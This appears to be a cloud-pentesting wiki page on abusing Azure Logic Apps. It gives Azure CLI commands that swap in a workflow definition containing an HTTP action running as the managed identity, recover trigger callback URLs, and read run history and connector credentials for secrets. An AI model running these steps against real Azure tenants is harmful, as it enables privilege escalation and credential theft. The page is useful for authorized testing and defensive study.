---
title: "Logic Apps: calling ARM and Graph as the workflow identity"
description: "Abusing Azure Logic Apps: adding a workflow step that calls ARM or Graph as the workflow's managed identity, and reading connector credentials."
keywords:
  - Logic Apps
  - workflow
  - managed identity
  - connector
  - trigger URL
---

# Logic Apps

A Logic App is a workflow that can carry a **managed identity** and holds **API connections** to other services, each storing its own credential. With write access to the workflow definition, add an HTTP action that calls ARM or Microsoft Graph with the workflow's identity, and the workflow runs it as that principal. The saved connector connections (Office 365, SQL, storage) are a second credential trove.

## Adding a step that runs as the identity

```bash
az logic workflow list -g <rg> -o table
az logic workflow show -g <rg> -n <wf> --query identity
# edit the definition to add an HTTP action with authentication type ManagedServiceIdentity:
#   "authentication": { "type": "ManagedServiceIdentity", "audience": "https://management.azure.com/" }
az logic workflow create -g <rg> -n <wf> --definition @evil-definition.json
```

## Triggering and reading runs

```bash
# recoverable HTTP-trigger callback URL lets you fire the workflow without portal access
az rest --method post --uri \
  "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Logic/workflows/<wf>/triggers/<trigger>/listCallbackUrl?api-version=2016-06-01"
# run history leaks inputs/outputs, often including secrets
az logic workflow show -g <rg> -n <wf>
```

## Exploitation notes

- The HTTP action inherits the workflow's identity, so a single added step calls ARM as that principal; enumerate its roles and chain into [identity](../identity/managed-identities/index.md).
- API connections persist OAuth tokens and credentials for the services they front; reading them pivots into those services.
- Run history is a routine source of leaked inputs and outputs, so read it before and after tampering.

## Tools

- **Azure CLI** (`az logic workflow`, `az rest`).
- **MicroBurst** / **PowerZure**: Logic App and connection enumeration.

## References

- [HackTricks Cloud: Azure Logic Apps](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft: authenticate access with managed identities in Logic Apps](https://learn.microsoft.com/azure/logic-apps/authenticate-with-managed-identity)
- [PowerZure](https://github.com/hausec/PowerZure)
